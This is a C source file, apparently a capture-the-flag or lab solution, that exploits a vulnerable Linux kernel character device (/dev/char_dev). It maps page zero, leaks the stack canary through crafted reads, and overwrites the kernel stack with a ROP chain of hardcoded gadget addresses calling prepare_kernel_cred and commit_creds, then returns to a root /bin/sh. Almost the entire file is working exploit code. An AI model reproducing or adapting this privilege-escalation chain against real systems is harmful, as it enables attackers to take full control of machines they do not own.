#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>

// https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/

// char cyclic_pattern[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBBBBBBBaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"

struct TrapFrame{
    void* rip;
    unsigned long user_cs;
    unsigned long user_rflags;
    void* rsp;
    unsigned long user_ss;
} __attribute__((packed));

struct TrapFrame tf;

#define native_write_cr4 0xffffffff810457d0
#define pop_rdi 0xffffffff8104dec1
#define pop_rdx 0xffffffff81025e22
#define prepare_kernel_cred 0xffffffff810cc140
#define commit_creds 0xffffffff810cbdd0

#define cmp_rdx_jne_pop2_ret 0xffffffff815bf184
#define mov_rdi_rax_jne_pop2_ret 0xffffffff8127a053
#define swapgs_pop1_ret 0xffffffff81077514
#define iretq 0xffffffff81039a1b
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00a34

// get shell
static void shell() {
    system("/bin/sh");
    exit(0);
}


static void save() {
    asm(
        "xor %rax, %rax;"
        "mov %cs, %ax;"
        "pushq %rax; popq tf+8;"
        "pushfq; popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "mov %ss, %ax;"
        "pushq %rax; popq tf+32;"
    );
    tf.rip = (&shell);
    // tf.rsp -= 1024;
}

/*

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(void)
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3;\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
};


 */

char expl_buf[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

char buf[0x1000] = {0};

int main(void) {
    int fd1 = open("/dev/char_dev", O_RDONLY);
    int fd2 = open("/dev/char_dev", O_RDONLY);

    // Create 0 addr mapping
    void *addr = mmap(0x0, 0x1000, PROT_READ | PROT_WRITE,
            MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    printf("mmaped at addr: %p\n", addr);
    // strcpy(addr, cyclic_pattern);

    size_t idx = 0;
    memcpy(addr, expl_buf, sizeof(expl_buf) - 1);
    idx += sizeof(expl_buf) - 1;


    // Null out message
    close(fd2);

    // trigger `dev_read` to read from our 0 mapped address
    // canary at offset 0x30. `strlen` of payload now <= 0x30
    // get canary by first setting `off` to 0x28
    // then asking for 0x38 bytes next time, so it passes checks
    // for *off >= len and gives me 16 bytes (last 8 of which is the canary)
    read(fd1, buf, 0x28);
    read(fd1, (buf + 0x28), 0x38);
    void *canary = *(void **)(buf + 0x30);
    printf("Canary: %p\n", canary);

    // write canary to required position in payload, overwriting previous `\n`,
    // so that now more bytes will be copied to kernel_stack
    *(void **)(addr + 0x30) = canary;
    // *(void **)(addr + 128) = &root_shell;


    // use this if we dont want to use
    // swapgs_restore_regs_and_return_to_usermode or it doesn't work
    signal(SIGSEGV, shell);

    // instead of the whole mov mov_rdi_rax_jne_pop2_ret thing which needed 2 more gadgets, we can use
    // 0xffffffff8110f940 : xchg rax, rdi ; or al, 0 ; pop rbp ; ret
    // this will exchange rax and rdi

    unsigned long long payload[] = {
        pop_rdi, 0,
        prepare_kernel_cred,
        pop_rdx, 8,
        cmp_rdx_jne_pop2_ret, 0, 0,
        mov_rdi_rax_jne_pop2_ret, 0, 0,
        // was getting +1 ed somehow in code
        commit_creds - 1,

        // swapgs_restore_regs_and_return_to_usermode + 22,
        // 0, 0

        // kpti makes this not work, without sigsegv trick
        swapgs_pop1_ret, 0,
        iretq,
    };

    memcpy(addr + idx, payload, sizeof(payload));
    idx += sizeof(payload);

    save();
    memcpy(addr + idx, &tf, sizeof(tf));
    idx += sizeof(tf);
    memcpy(addr + idx, "\n", 1);

    // trigger exploit with our payload, with canary in it
    read(fd1, buf, 0x39);

    // I am a good person, I will return the memory after I am done exploiting
    // :)
    munmap(addr, 0x1000);
    printf("Returned from kernel\n");
    return 0;
}

/*

dev_read = 0xffffffffc0002110
prepare_kernel_cred = 0xffffffff810cc140
commit_creds = 0xffffffff810cbdd0
native_write_cr4 = 0xffffffff810457d0
canary : 0x8b5ca5519cc54a00
$rbp - 0x30
 */


